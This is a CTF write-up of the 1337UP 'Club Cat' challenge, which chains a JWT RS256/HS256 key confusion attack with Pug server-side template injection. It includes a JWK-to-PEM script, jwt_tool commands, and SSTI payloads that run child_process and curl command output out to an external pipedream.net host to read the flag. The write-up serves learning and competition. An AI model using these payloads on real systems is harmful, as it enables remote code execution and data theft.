##**Key Confusion Attack with JWT and Pug SSTI**

## **Description**
People are always complaining that there's not enough cat pictures on the internet.. Something must be done!!
<br></br>

1. Identifying the Attack Surface
While reading through the source code, I discovered that the RS256 JWT keys were publicly accessible via the /jwks.json route. 
<img src="https://github.com/Yazan03/CTF-Writeups2024/blob/main/1337UP%20CTF/Club%20Cat/images/Capture.PNG">
<br></br>
This gives us the ability to perform a key confusion attack, as described here
<br></br>
https://portswigger.net/web-security/jwt/algorithm-confusion

Further investigation revealed a route called /cats, which processes a Pug SSTI (Server-Side Template Injection) vulnerability in the username parameter. This username is directly extracted from the JWT token.
<br></br>
<img src="https://github.com/Yazan03/CTF-Writeups2024/blob/main/1337UP%20CTF/Club%20Cat/images/2.PNG">
<br></br>
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#pugjs-nodejs 
<br></br>
2. Attack Strategy
Based on the information, the attack surface could be summarized as follows:

Retrieve the RS256 keys from the /jwks.json endpoint.
Perform a key confusion attack to inject a payload into the username.
Exploit the Pug SSTI vulnerability.
Gain Remote Code Execution (RCE) and read the flag.
<br></br>

3. Exploiting RS256 Key Confusion
To proceed, I used a script to convert the RS256 key into a .pem file, which could be used with jwt_tool. This allowed me to manipulate the JWT token.
```py
import base64
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers


jwk = {
    "kty": "RSA",
    "n": "w4oPEx-448XQWH_OtSWN8L0NUDU-rv1jMiL0s4clcuyVYvgpSV7FsvAG65EnEhXaYpYeMf1GMmUxBcyQOpathL1zf3_Jk5IsbhEmuUZ28Ccd8l2gOcURVFA3j4qMt34OlPqzf9nXBvljntTuZcQzYcGEtM7Sd9sSmg8uVx8f1WOmUFCaqtC26HdjBMnNfhnLKY9iPxFPGcE8qa8SsrnRfT5HJjSRu_JmGlYCrFSof5p_E0WPyCUbAV5rfgTm2CewF7vIP1neI5jwlcm22X2t8opUrLbrJYoWFeYZOY_Wr9vZb23xmmgo98OAc5icsvzqYODQLCxw4h9IxGEmMZ-Hdw",
    "e": "AQAB"
}


n = int.from_bytes(base64.urlsafe_b64decode(jwk["n"] + "=="), byteorder='big')
e = int.from_bytes(base64.urlsafe_b64decode(jwk["e"] + "=="), byteorder='big')


public_numbers = RSAPublicNumbers(e, n)
public_key = public_numbers.public_key()


pem = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

# Save to a .pem file
with open("public_key.pem", "wb") as pem_file:
    pem_file.write(pem)

print("Public RSA key saved to public_key.pem")
```
<br></br>
```text
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAw4oPEx+448XQWH/OtSWN
8L0NUDU+rv1jMiL0s4clcuyVYvgpSV7FsvAG65EnEhXaYpYeMf1GMmUxBcyQOpat
hL1zf3/Jk5IsbhEmuUZ28Ccd8l2gOcURVFA3j4qMt34OlPqzf9nXBvljntTuZcQz
YcGEtM7Sd9sSmg8uVx8f1WOmUFCaqtC26HdjBMnNfhnLKY9iPxFPGcE8qa8SsrnR
fT5HJjSRu/JmGlYCrFSof5p/E0WPyCUbAV5rfgTm2CewF7vIP1neI5jwlcm22X2t
8opUrLbrJYoWFeYZOY/Wr9vZb23xmmgo98OAc5icsvzqYODQLCxw4h9IxGEmMZ+H
dwIDAQAB
-----END PUBLIC KEY-----
```
<br></br>

4. JWT Token Manipulation
Next, I created an account and captured the JWT token. Afterward, I used jwt_tool to craft a custom token that exploited the SSTI vulnerability by injecting arbitrary code into the username field.
<img src="https://github.com/Yazan03/CTF-Writeups2024/blob/main/1337UP%20CTF/Club%20Cat/images/3.PNG">
<img src="https://github.com/Yazan03/CTF-Writeups2024/blob/main/1337UP%20CTF/Club%20Cat/images/4.PNG">

<br></br>
And then use jwt_tool
```sh
$ python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6ImFzZCJ9.WtNj-PzZesPRM7CZqAXXauI3TV6DcliuJbVzFOaqWajtLk96VzBjMTxap5hT9d09xraiu2CgCoX1dEg8ACpyPWfmOmxgLdwZvnL1qjjhv3ErwakYSJsn-Fe8WGeqDu4ZeSxjwR7xFjQXSBlvG9WytuWlpNBG6jM_6tY12euNs2oUW8VMV2HJM_GOEfwOMrb8lsV5JChgE3Eea9Uqa-DSpNkBvOlgWXo1gjgmlFP6TWDvxLA24O986jwFlBibxvVOOlsYhXuqiZUI-ynSxT8ZdivLYgOG58oxtvvbFuiXYc9fnSXC97eMnx_kXVE1RrYzQD_ZPC3o4CaqFK465_RK2g -X k -pk ~/Downloads/web/app/public_key.pem -I -pc username -pv "#{7*7}"

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IiN7Nyo3fSJ9.lsLiuUrEkr81Z73IyAJmF7gTJfp9WwqErjPlr9e9UvI
```
<br></br>
<img src="https://github.com/Yazan03/CTF-Writeups2024/blob/main/1337UP%20CTF/Club%20Cat/images/6.PNG">
<br></br>
It worked!, now let's see where the flag is, From the Dockerfile we can see that the flag is randomized and it's in the root directory.
<br></br>
<img src="https://github.com/Yazan03/CTF-Writeups2024/blob/main/1337UP%20CTF/Club%20Cat/images/7.PNG">
<br></br>
```sh
─$ python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6ImFzZCJ9.WtNj-PzZesPRM7CZqAXXauI3TV6DcliuJbVzFOaqWajtLk96VzBjMTxap5hT9d09xraiu2CgCoX1dEg8ACpyPWfmOmxgLdwZvnL1qjjhv3ErwakYSJsn-Fe8WGeqDu4ZeSxjwR7xFjQXSBlvG9WytuWlpNBG6jM_6tY12euNs2oUW8VMV2HJM_GOEfwOMrb8lsV5JChgE3Eea9Uqa-DSpNkBvOlgWXo1gjgmlFP6TWDvxLA24O986jwFlBibxvVOOlsYhXuqiZUI-ynSxT8ZdivLYgOG58oxtvvbFuiXYc9fnSXC97eMnx_kXVE1RrYzQD_ZPC3o4CaqFK465_RK2g -X k -pk ~/Downloads/web/app/public_key.pem -I -pc username -pv "#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad(\"child_process\").exec('curl https://eogce8tgujfgk5f.m.pipedream.net?=\`ls /|base64\`')}()}"


[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IiN7ZnVuY3Rpb24oKXtsb2NhbExvYWQ9Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZDtzaD1sb2NhbExvYWQoXCJjaGlsZF9wcm9jZXNzXCIpLmV4ZWMoJ2N1cmwgaHR0cHM6Ly9lb2djZTh0Z3VqZmdrNWYubS5waXBlZHJlYW0ubmV0Pz1gbHMgL3xiYXNlNjRgJyl9KCl9In0.PxWfN3-n3u4IxcWorBADNw52W-NFJ491nrf5ATz9WNs 
```
And we got a callback
<br></br>
<img src="https://github.com/Yazan03/CTF-Writeups2024/blob/main/1337UP%20CTF/Club%20Cat/images/8.PNG">
<br></br>
Then we got the flag file name: 
<br></br>
<img src="https://github.com/Yazan03/CTF-Writeups2024/blob/main/1337UP%20CTF/Club%20Cat/images/9.PNG">
<br></br>

5. Getting the Flag

```sh
$ python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6ImFzZCJ9.WtNj-PzZesPRM7CZqAXXauI3TV6DcliuJbVzFOaqWajtLk96VzBjMTxap5hT9d09xraiu2CgCoX1dEg8ACpyPWfmOmxgLdwZvnL1qjjhv3ErwakYSJsn-Fe8WGeqDu4ZeSxjwR7xFjQXSBlvG9WytuWlpNBG6jM_6tY12euNs2oUW8VMV2HJM_GOEfwOMrb8lsV5JChgE3Eea9Uqa-DSpNkBvOlgWXo1gjgmlFP6TWDvxLA24O986jwFlBibxvVOOlsYhXuqiZUI-ynSxT8ZdivLYgOG58oxtvvbFuiXYc9fnSXC97eMnx_kXVE1RrYzQD_ZPC3o4CaqFK465_RK2g -X k -pk ~/Downloads/web/app/public_key.pem -I -pc username -pv "#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad(\"child_process\").exec('curl https://eogce8tgujfgk5f.m.pipedream.net?=\`ls /flag_Gx4wVbEc1fxN9ztM.txt|base64\`')}()}"


[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IiN7ZnVuY3Rpb24oKXtsb2NhbExvYWQ9Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZDtzaD1sb2NhbExvYWQoXCJjaGlsZF9wcm9jZXNzXCIpLmV4ZWMoJ2N1cmwgaHR0cHM6Ly9lb2djZTh0Z3VqZmdrNWYubS5waXBlZHJlYW0ubmV0Pz1gbHMgL2ZsYWdfR3g0d1ZiRWMxZnhOOXp0TS50eHR8YmFzZTY0YCcpfSgpfSJ9.1IMzf-EtCtP7W_oeblc7njtLt6aeSNy5DqxJgeX1KZY 
```
<br></br>
<img src="https://github.com/Yazan03/CTF-Writeups2024/blob/main/1337UP%20CTF/Club%20Cat/images/10.PNG">
<br></br>
```
INTIGRITI{h3y_y0u_c4n7_ch41n_7h053_vuln5_l1k3_7h47}
```
